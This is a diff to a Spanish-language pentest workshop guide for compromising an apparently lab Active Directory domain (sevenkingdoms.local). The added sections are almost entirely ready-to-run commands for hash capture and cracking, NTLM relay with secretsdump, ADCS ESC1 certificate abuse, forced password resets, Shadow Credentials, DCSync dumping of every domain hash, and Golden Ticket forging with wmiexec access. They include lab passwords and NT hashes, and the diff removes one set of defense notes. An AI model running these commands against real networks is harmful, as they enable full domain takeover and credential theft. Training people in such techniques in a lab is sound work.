@@ -138,14 +138,18 @@ sudo responder -I <interfaz>
 ```
 
 Recibiremos un request parecido a esto:
-![[ObtainedHash.png]]
+[[Imagenes/ObtainedHash.png]]
+
+Buscamos los hashes entre los logs de Responder y los movemos a la carpeta de WorkShop2025:
+```bash
+cp /usr/share/responder/logs/<nombre_del_archivo>.txt ./responder.hash
+```
 
 Si capturamos un hash NTLMv2, podemos tratar de crackearlos con:
 
 ```bash
 hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
 ```
-
 
 **Defensa:**
 - Deshabilitar LLMNR y NetBIOS en todas las máquinas.
@@ -154,8 +158,20 @@ hashcat -m 5500 --force -a 0 responder.hash /usr/share/wordlists/rockyou.txt
 ### 4.2 NTLM Relay Attack
 Este ataque permite redirigir autenticaciones NTLM capturadas hacia otro sistema.
 
+Generamos el listado de maquinas que pueden ser afectadas con:
+```bash
+nxc smb 192.168.46.10-23 --gen-relay-list relay.txt
+```
+
+Modificamos los valores de servers que empiezan con Responder y desactivamos los servicios SMB, HTTP, y HTTPS.
+
 ```bash
 ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.46.22 -smb2support -socks
+```
+
+Una vez que tengamos una conexion con socks, podemos correr:
+```bash
+proxychains4 -q impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46.22'
 ```
 
 **Defensa:**
@@ -163,11 +179,74 @@ ntlmrelayx.py -tf relay.txt -of netntlm -t NORTH\EDDARD.STARK@192.168.46.22 -smb
 - Monitorear autenticaciones NTLM inusuales.
 
 ---
+## 5. Ataques de Elevación de Privilegios
+### 5.1 ADCS - ESC1
+Lanzamos el ataque:
+```bash
+certipy find -u cersei.lannister -p 'il0vejaime' -dc-ip 192.168.46.10 -debug -vulnerable -stdout
+```
 
-## 5. Ataques Persistentes
+Vemos que tenemos 1 template que permite la autenticacion de Kerberos:
 
-### 5.1 Golden Ticket Attack
-Este ataque permite crear TGTs falsos usando el hash del servicio `KRBTGT`.
+[[Imagenes/ESC1-Vulnerable.png]]
+
+Ya que sabemos que existe un template vulnerable, podemos correr el siguiente comando:
+```bash
+certipy req -u cersei.lannister -p 'il0vejaime' -target kingslanding.sevenkingdoms.local -template ESC1 -ca SEVENKINGDOMS-CA -upn administrator@sevenkingdoms.local
+```
+
+El cual nos solicitara un ticket como el usuario de administrador. Ahora lo utilizamos para revelar el hash del usuario de Administrador en DC01:
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.46.10
+```
+
+Podemos correr comandos de alto nivel como:
+```bash
+secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e Administrator@192.168.46.10
+```
+
+### 5.2 Shadow Credentials
+
+Podemos forzar un cambio de password desde el usuario de `tywin.lannister`, con:
+```bash
+net rpc password "jaime.lannister" "testing1" -U "sevenkingdoms.local"/"tywin.lannister"%"powerkingftw135" -S 192.168.46.10
+```
+
+Esto hace que la password sea cambiada al usuario `jaime.lannister`, con el usuario de `jaime.lannister` podemos aplicar el ataque de ShadowCredentials al usuario de `joffrey.baratheon`:
+
+```bash
+certipy shadow auto -u jaime.lannister@sevenkingdoms.local -p 'cersei' -account 'joffrey.baratheon'
+```
+
+Podemos verificar que este hash funcione con:
+```bash
+nxc rdp 192.168.46.10-23 -u joffrey.baratheon -H 3b60abbc25770511334b3829866b08f1
+```
+
+Podemos abusar esto con el usuario de `lord.varys` contra el usuario Administrator:
+```bash
+certipy shadow auto -u lord.varys@sevenkingdoms.local -p '_W1sper_$' -account 'administrator'
+```
+
+---
+
+## 6.  Post Explotación
+
+### 6.1 DCSync
+Este ataque permite dumpear completamente la base de datos de Active Directory utilizando los servicios de replicación de AD.
+
+```bash
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.10 -output sevenkingdoms-local.hashes
+secretsdump.py -hashes :c66d72021a2d4744409969a581a1705e -just-dc SEVENKINGDOMS.LOCAL/Administrator@192.168.46.11 -output north.sevenkingdoms.local-hashes
+```
+
+Este muestra todos los hashes de todos los usuarios (habilitados o inhabilitados) del active directory.
+
+### 6.2 Golden Ticket 
+Ya que tenemos el admin, y sacamos el nthash del servicio de KRBTGT, que tiene poder para crear nthashes de cualquier tipo, y solo para probar, vamos a generar un ticket del usuario `robert.baratheon` :
+```bash
+ticketer.py -nthash c1802a1d08b57644a6a1a2ca0b57fbc6 -domain-sid S-1-5-21-1768168739-1086324585-3153665815 -domain SEVENKINGDOMS.LOCAL ROBERT.BARATHEON
+```
 
 ```bash
 ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain SEVENKINGDOMS.LOCAL robert.baratheon
@@ -176,7 +255,7 @@ ticketer.py -nthash <krbtgt-hash> -domain-sid <domain-sid> -domain SEVENKINGDOMS
 Después de generarlo, lo cargamos con:
 
 ```bash
-export KRB5CCNAME=/home/kali/Documents/pt/ROBERT.BARATHEON.ccache
+export KRB5CCNAME=/home/pentester/Desktop/Workshop2025/CATELYN.STARK.ccache
 ```
 
 Finalmente, accedemos a una máquina objetivo:
@@ -185,6 +264,9 @@ Finalmente, accedemos a una máquina objetivo:
 wmiexec.py -k -dc-ip 192.168.46.10 -target-ip 192.168.46.10 -no-pass sevenkingdoms.local/robert.baratheon@kingslanding.sevenkingdoms.local
 ```
 
-**Defensa:**
-- Rotar la contraseña del usuario `KRBTGT` regularmente.
-- Habilitar `Windows Defender Credential Guard`.
+Ejemplo con `catelyn.stark`:
+```bash
+wmiexec.py -k -dc-ip 192.168.46.11 -target-ip 192.168.46.11 -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
+```
+
+A pesar de que la contraseña cambie varias veces, el Golden Ticket seguirá siendo vigente.
